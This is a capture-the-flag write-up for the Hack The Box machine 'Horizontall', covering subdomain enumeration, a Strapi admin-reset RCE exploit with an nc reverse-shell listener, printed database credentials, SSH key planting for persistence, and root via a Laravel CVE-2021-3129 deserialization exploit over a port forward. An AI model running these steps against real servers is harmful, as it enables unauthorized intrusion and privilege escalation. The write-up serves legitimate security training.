# Introduction

[![Horizontall](https://www.hackthebox.eu/storage/avatars/e4ec7d8504fdb58b5e6b7ddc82aafc77.png)](https://app.hackthebox.eu/machines/Horizontall)

| Point | Description |
| :------:| :------: |
| Name | Horizontall |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 28 Aug 2021   |
| IP | 10.10.11.105   |
| Owned | 03 Sep 2021 |

# Short retelling

* Enumeration and find subdomain and directories
* Use blind rce in Strapi
* Use ssh port forwarding to exploit RCE in Laravel

# Enumeration

## Nmap

Recon host 10.10.11.105 with Nmap and Add horizontall.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali]
└─# nmap -T4 -A -p- --min-rate 500 10.10.11.105
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 03:13 EDT
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/3%OT=22%CT=1%CU=44731%PV=Y%DS=2%DC=T%G=Y%TM=6131CBB3
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11
OS:NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   203.27 ms 10.10.16.1
2   94.32 ms  horizontall.htb (10.10.11.105)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.03 seconds
```
Checking 80 http service

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/h1.PNG)

We see just one-page site without any links

## Gobuster

Let's try to find some directories

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# gobuster dir -e -u http://horizontall.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,.txt,.htm,.html,.phtml,.js,.zip,.rar,.tar -t 100    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://horizontall.htb/
[+] Threads:        100
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js,zip,rar,tar,htm,html,phtml,php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/09/03 03:21:05 Starting gobuster
===============================================================
http://horizontall.htb/css (Status: 301)
http://horizontall.htb/favicon.ico (Status: 200)
http://horizontall.htb/img (Status: 301)
http://horizontall.htb/index.html (Status: 200)
http://horizontall.htb/index.html (Status: 200)
http://horizontall.htb/js (Status: 301)
===============================================================
2021/09/03 03:21:54 Finished
===============================================================
```
Ok, nothing interesting

## Ffuf

Enumerate subdomains

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb/ -H "Host:FUZZ.horizontall.htb" -fw 7 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 7
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20]
:: Progress: [114441/114441] :: Job [1/1] :: 983 req/sec :: Duration: [0:01:53] :: Errors: 0 ::
```

We find `api-prod` subdomain. Add api-prod.horizontall.htb to /etc/hosts.

Checking api-prod.horizontall.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/h2.PNG)


## Gobuster

Let use Gobuster again

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# gobuster dir -e -u http://api-prod.horizontall.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,.txt,.htm,.html,.phtml,.js,.zip,.rar,.tar -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://api-prod.horizontall.htb/
[+] Threads:        100
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html,zip,rar,htm,phtml,js,tar
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/09/03 03:37:53 Starting gobuster
===============================================================
http://api-prod.horizontall.htb/Admin (Status: 200)
http://api-prod.horizontall.htb/ADMIN (Status: 200)
http://api-prod.horizontall.htb/admin (Status: 200)
http://api-prod.horizontall.htb/favicon.ico (Status: 200)
http://api-prod.horizontall.htb/index.html (Status: 200)
http://api-prod.horizontall.htb/index.html (Status: 200)
http://api-prod.horizontall.htb/robots.txt (Status: 200)
http://api-prod.horizontall.htb/robots.txt (Status: 200)
http://api-prod.horizontall.htb/reviews (Status: 200)
http://api-prod.horizontall.htb/users (Status: 403)
===============================================================
2021/09/03 03:39:23 Finished
===============================================================
```

`http://api-prod.horizontall.htb/Admin` has authentication form.
`http://api-prod.horizontall.htb/robots.txt` hasn't interesting info
`http://api-prod.horizontall.htb/reviews` we find out about 3 usernames: wail, doe, john.

# Explotation

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/h3.PNG)

We see interesting service `Strapi`

We find out version of `Strapi`

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# curl http://api-prod.horizontall.htb/admin/strapiVersion 
{"strapiVersion":"3.0.0-beta.17.4"} 
```

And find some exploits for this version:
* https://www.exploit-db.com/exploits/50238
* https://www.exploit-db.com/exploits/50237
* https://www.exploit-db.com/exploits/50239

Let's download RCE and use it

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# python3 rce_strapi.py http://api-prod.horizontall.htb/                
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNjU2NTMzLCJleHAiOjE2MzMyNDg1MzN9.Hx15aisOP513tmKCOI8nLXet7e3AItigKDOXZvEs0X4


$> id
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$> 
```

This blind RCE, so run reverse shell

```
┌──(root💀kali)-[/home/kali]
└─# nc -lvp 5555                                                                                                                                                         
listening on [any] 5555 ...
connect to [10.10.17.200] from horizontall.htb [10.10.11.105] 38720
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ id
id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
strapi@horizontall:~/myapi$ ls
ls
api
build
config
extensions
favicon.ico
node_modules
package.json
package-lock.json
public
README.md
rev.php
strapi@horizontall:~/myapi$
```

And we can read **user.txt**

```
strapi@horizontall:~/myapi$ cat /home/developer/user.txt
cat /home/developer/user.txt
7bbe47854ed9c337294f4ace02a9b8d4
```

# Privilege Escalation

In LinPEAS we find credentials for mysql

```
-rw-rw-r-- 1 strapi strapi 351 May 26 14:31 /opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

But I dont find any interesting information there...

And we cant login with this password

```
strapi@horizontall:~/myapi$ su developer
su developer
Password: #J!:F9Zt2u

su: Authentication failure
```

Also we find listening ports *1337* and *8000*

```
╔══════════╣ Active Ports                                                                                                                                                                                        
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1959/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                            
tcp        0      0 0.0.0.0:6060            0.0.0.0:*               LISTEN      4409/python3                                                                                                                     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                                                                                                
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                
tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                                                                                
tcp6       0      0 :::22                   :::*                    LISTEN      -                                                                                                                                
```

Checking `ocalhost:1337`

```
strapi@horizontall:~/myapi$ curl localhost:1337
curl localhost:1337
<!doctype html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Welcome to your API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
    </style>
  </head>
  <body lang="en">
    <section>
      <div class="wrapper">
        <h1>Welcome.</h1>
      </div>
    </section>
  </body>
</html>
```


Checking `localhost:8000` and render html code

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/h4.PNG)

We see Laravel service with version Laravel v8 (PHP v7.4.18)

Lets try ti find some exploits:
* https://github.com/ambionics/laravel-exploits
* https://github.com/nth347/CVE-2021-3129_exploit

Dowload last exploit. We need to creat ssh port forwaring to connect `localhost:8000`

We need to create ssh coonection at first. Copy our public key to authorization_keys of horizontall.htb

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDR0mL+YxH/RFkrekg7009ktTTO4A3MZwRWnK7MxWVK6OokKcObyHxgRtpYvcciB08a2fWyRZrQH86bs8N4lrTYgDIk4dzUytOTMVBZRL0pQ3sbO1+y1I/uCvn9dk7CE3tsdqMNRjk9JL8Rw6So8rHMTBX0dgOQQloxDGcVE3QJ/HpBcb6Q6fKEZ9DaMF2cq9dR0r57Z01y+2HvQp6amxWEFu7dYT/QWVazXjMJPnkFUxzorc0J23Fw1zLLQ3xbBKPUWPzso0Zg5+MMS0VIurlUZdsJ0YuieIGwd6yL8tZAAnwBt/V4IB6SOrMw3vGoi9X6D1ISK/JPO98+N3u6c27E4Lzd6lxWhD7D+NBf4rube9Kd3+1dFfuYqukCJx0munYZXXkiPVPrhrM3RJFHKas5cMb+WU1864HcXGCC22OUUoAChZiKAxr91e79WAQmuJBDiGE/VVkiQTDfVxJ6YUZMaGlSIeNY/C+/j7HopVU1rFmFzGgYUcncOW9nN8t48xs= root@kali
```

```
strapi@horizontall:~$ ls
ls
myapi
strapi@horizontall:~$ ls -la
ls -la
total 48
drwxr-xr-x  9 strapi strapi 4096 Sep  3 08:49 .
drwxr-xr-x  3 root   root   4096 May 26 14:24 ..
-rw-r--r--  1 strapi strapi  231 Jun  1 12:50 .bash_logout
-rw-r--r--  1 strapi strapi 3810 Jun  1 12:49 .bashrc
drwx------  2 strapi strapi 4096 May 26 14:29 .cache
drwx------  3 strapi strapi 4096 May 26 14:30 .config
drwx------  3 strapi strapi 4096 May 26 14:29 .gnupg
drwxrwxr-x  3 strapi strapi 4096 Jun  1 12:07 .local
drwxr-xr-x 10 strapi strapi 4096 Sep  3 08:37 myapi
drwxrwxr-x  5 strapi strapi 4096 Sep  3 08:29 .npm
drwxrwxr-x  5 strapi strapi 4096 Sep  3 05:05 .pm2
-rw-r--r--  1 strapi strapi  807 Apr  4  2018 .profile
strapi@horizontall:~$ ssh-keygen -t rsa
ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/opt/strapi/.ssh/id_rsa): 

Created directory '/opt/strapi/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /opt/strapi/.ssh/id_rsa.
Your public key has been saved in /opt/strapi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:uEweRF/MOrwfsXl5dW35fo8xYu9nKeSeqzIZFJcHa1Q strapi@horizontall
The key's randomart image is:
+---[RSA 2048]----+
|      .  o.o+E   |
|     . . o+o..   |
|      ....oo.   o|
|     . .+.o    .=|
|      + So + . oo|
|     + o..+ o.. .|
|      +  .oo=.o..|
|         +.. =.==|
|          o.o=*o+|
+----[SHA256]-----+
strapi@horizontall:~$ cd .ssh ls
cd .ssh ls
bash: cd: too many arguments
strapi@horizontall:~$ cd .ssh
cd .ssh
strapi@horizontall:~/.ssh$ ls
ls
id_rsa  id_rsa.pub
strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDR0mL+YxH/RFkrekg7009ktTTO4A3MZwRWnK7MxWVK6OokKcObyHxgRtpYvcciB08a2fWyRZrQH86bs8N4lrTYgDIk4dzUytOTMVBZRL0pQ3sbO1+y1I/uCvn9dk7CE3tsdqMNRjk9JL8Rw6So8rHMTBX0dgOQQloxDGcVE3QJ/HpBcb6Q6fKEZ9DaMF2cq9dR0r57Z01y+2HvQp6amxWEFu7dYT/QWVazXjMJPnkFUxzorc0J23Fw1zLLQ3xbBKPUWPzso0Zg5+MMS0VIurlUZdsJ0YuieIGwd6yL8tZAAnwBt/V4IB6SOrMw3vGoi9X6D1ISK/JPO98+N3u6c27E4Lzd6lxWhD7D+NBf4rube9Kd3+1dFfuYqukCJx0munYZXXkiPVPrhrM3RJFHKas5cMb+WU1864HcXGCC22OUUoAChZiKAxr91e79WAQmuJBDiGE/VVkiQTDfVxJ6YUZMaGlSIeNY/C+/j7HopVU1rFmFzGgYUcncOW9nN8t48xs= root@kali" >> authorized_keys
```

And we get ssh connection

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# ssh -i ~/.ssh/id_rsa strapi@horizontall.htb                                                                                                                                                            130 ⨯
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep  3 08:52:05 UTC 2021

  System load:  0.07              Processes:           191
  Usage of /:   86.6% of 4.85GB   Users logged in:     0
  Memory usage: 50%               IP address for eth0: 10.10.11.105
  Swap usage:   0%

  => / is using 86.6% of 4.85GB


0 updates can be applied immediately.


Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
$ /bin/bash
strapi@horizontall:~$ 
```

SSH port forwarding

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# ssh strapi@horizontall.htb -i ~/.ssh/id_rsa  -L 8888:localhost:8000
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
```

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/h5.PNG)

And we can see web server from kali.

Let's use exploit

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# python3 laravel_exploit.py http://localhost:8888 Monolog/RCE1 whoami                                                                                                                                     1 ⨯
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

root

[i] Trying to clear logs
[+] Logs cleared
```

And we get **root.txt**

```
┌──(root💀kali)-[/home/kali/HTB/Horizontall]
└─# python3 laravel_exploit.py http://localhost:8888 Monolog/RCE1 'cat /root/root.txt'
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

bbc22514f7d02369544f92de15145785

[i] Trying to clear logs
[+] Logs cleared
```

# Resources

1. 

